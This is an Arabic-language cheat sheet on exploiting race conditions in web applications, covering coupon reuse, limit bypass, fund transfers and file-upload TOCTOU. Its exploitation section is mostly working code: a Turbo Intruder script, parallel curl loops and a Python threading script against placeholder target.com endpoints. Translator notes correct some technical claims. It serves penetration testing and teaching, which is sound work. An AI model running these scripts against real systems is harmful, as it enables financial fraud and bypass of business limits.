<a id="-race-conditions-cheatsheet"></a>
# ⚡ مرجع حالات التسابق (Race Conditions)

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██████╗  █████╗  ██████╗███████╗     ██████╗ ██████╗ ███╗   ██╗██████╗ ██╗████████╗██╗ ██████╗ ███╗   ██╗███████╗
  ██╔══██╗██╔══██╗██╔════╝██╔════╝    ██╔════╝██╔═══██╗████╗  ██║██╔══██╗██║╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝
  ██████╔╝███████║██║     █████╗      ██║     ██║   ██║██╔██╗ ██║██║  ██║██║   ██║   ██║██║   ██║██╔██╗ ██║███████╗
  ██╔══██╗██╔══██║██║     ██╔══╝      ██║     ██║   ██║██║╚██╗██║██║  ██║██║   ██║   ██║██║   ██║██║╚██╗██║╚════██║
  ██║  ██║██║  ██║╚██████╗███████╗    ╚██████╗╚██████╔╝██║ ╚████║██████╔╝██║   ██║   ██║╚██████╔╝██║ ╚████║███████║
  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝     ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝
```

---

<a id="-what-are-race-conditions"></a>
## 🎯 ما حالات التسابق؟

تحدث **حالات التسابق** عندما يمكن استغلال توقيت العمليات أو تداخلها، كما في ثغرات التحقق ثم الاستخدام.

<a id="impact"></a>
### الأثر
- 💰 **احتيال مالي** - استرداد القيمة عدة مرات
- 🎫 **إساءة استخدام القسائم** - استخدام رمز الخصم نفسه عدة مرات
- 👤 **رفع الامتيازات** - تجاوز عمليات التحقق
- 📂 **الكتابة فوق الملفات** - هجمات TOCTOU

---

<a id="-common-targets"></a>
## 🔍 أهداف شائعة

```
- استخدام القسائم وأكواد العروض
- أنظمة التصويت والإعجاب
- تحويل الأموال
- العمليات المقيدة بحدود
- رفع الملفات
- إعادة تعيين كلمة المرور
- التحقق بعاملين (2FA)
- تسجيل الحسابات
```

---

<a id="-exploitation-techniques"></a>
## 💉 تقنيات الاستغلال

<a id="burp-suite-turbo-intruder"></a>
### Burp Suite Turbo Intruder

```python
# إرسال الطلب عدة مرات بالتوازي
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=100,
        pipeline=True
    )
    
    for i in range(30):
        engine.queue(target.req)

def handleResponse(req, response):
    if '200' in response.status:
        table.add(response)
```

<a id="burp-repeater-manual"></a>
### Burp Repeater للاختبار اليدوي
```
1. أرسل الطلب إلى Repeater
2. كرّر التبويب 20+ مرة
3. أنشئ مجموعة تبويبات
4. انقر "Send group (parallel)"
```

<a id="curl-parallel"></a>
### طلبات متوازية باستخدام curl
```bash
# إرسال 20 طلبًا متوازيًا
seq 1 20 | xargs -P 20 -I {} curl -s https://target.com/redeem?code=PROMO123

# مع بيانات POST
for i in {1..20}; do
  curl -X POST https://target.com/transfer \
    -d "amount=100&to=attacker" &
done
wait
```

<a id="python-threading"></a>
### خيوط التنفيذ في Python
```python
import threading
import requests

def exploit():
    r = requests.post("https://target.com/redeem", 
                      data={"code": "PROMO50"})
    print(r.status_code)

threads = []
for i in range(50):
    t = threading.Thread(target=exploit)
    threads.append(t)

# بدء تشغيل جميع الخيوط
for t in threads:
    t.start()

for t in threads:
    t.join()
```

---

<a id="-common-scenarios"></a>
## 📊 سيناريوهات شائعة

<a id="coupon-code-race"></a>
### التسابق على رمز القسيمة
```
1. القسيمة = خصم 50%
2. في الحالة العادية: الاستخدام مرة واحدة
3. التسابق: الاستخدام 10x بالتوازي
4. النتيجة: 10 طلبات بخصم 50%
```

<a id="limit-bypass"></a>
### تجاوز الحد المسموح
```
1. الحد: 3 تنزيلات/يوم
2. التسابق: طلب 10 تنزيلات في الوقت نفسه
3. تُجرى عمليات التحقق بالتوازي
4. النتيجة: تنجح التنزيلات 10 جميعها قبل تطبيق الحد
```

<a id="file-upload-race-toctou"></a>
### التسابق في رفع الملفات (TOCTOU)
```
1. رفع الملف ثم التحقق من سلامته
2. استبداله بملف خبيث قبل نقله
3. ينقل الخادم الملف الخبيث بدلًا من الملف المتحقق منه
```

---

<a id="-tools"></a>
## 🛠️ الأدوات

| الأداة | الغرض |
|------|---------|
| **Turbo Intruder** | إضافة Burp لإرسال طلبات متوازية |
| **race-the-web** | أداة بلغة Go لاختبار حالات التسابق |
| **racepwn** | أداة Python لاختبار حالات التسابق |

---

<a id="-resources"></a>
## 📚 الموارد

- [حالات التسابق من PortSwigger](https://portswigger.net/web-security/race-conditions)
- [OWASP TOCTOU](https://owasp.org/www-community/vulnerabilities/Time_of_check_to_time_of_use)

---

<p align="center">
  <b>⚡ استغلّ عامل التوقيت!</b><br>
  <i>للاختبارات المأذون بها فقط!</i>
</p>

> **مصطلحات:** نافذة التسابق (Race Window) هي الفترة التي قد تتداخل فيها عمليتان على الحالة نفسها. TOCTOU اختصار Time of Check to Time of Use، أي الفاصل بين التحقق من المورد واستخدامه؛ ليست كل حالة تسابق من هذا النوع. أمثلة القسائم والتنزيلات نتائج توضيحية تعتمد على تصميم التطبيق. حُفظ الرسم النصي الإنجليزي للحفاظ على محاذاته.

> **تصحيح لمثال Turbo Intruder:** في القالب الرسمي يستقبل `handleResponse` الوسيطين req وinteresting، وتُضاف النتيجة باستخدام `table.add(req)`. لذلك فإن التعامل مع الوسيط الثاني بوصفه كائنًا له status، كما يفعل مثال الأصل، لا يطابق هذا القالب. أُبقي المقتطف الأصلي حرفيًا للمقارنة. [قالب PortSwigger الرسمي](https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/race-single-packet-attack.py).

> **توضيح للتزامن:** إنشاء عدة خيوط أو استخدام curl بالتوازي لا يضمن وصول الطلبات أو معالجتها في اللحظة نفسها. يصف توثيق PortSwigger تقنيات مزامنة، مثل البوابات في Turbo Intruder وتقنية Single-packet attack مع HTTP/2. أما إعداد pipeline=True وحده في المثال الأصلي فلا يعبّر عن آلية البوابات الموثقة. [مرجع حالات التسابق](https://portswigger.net/web-security/race-conditions). لا يثبت رمز استجابة 200 وحده تجاوز قيد أعمال؛ تُفحص الحالة النهائية والأثر.
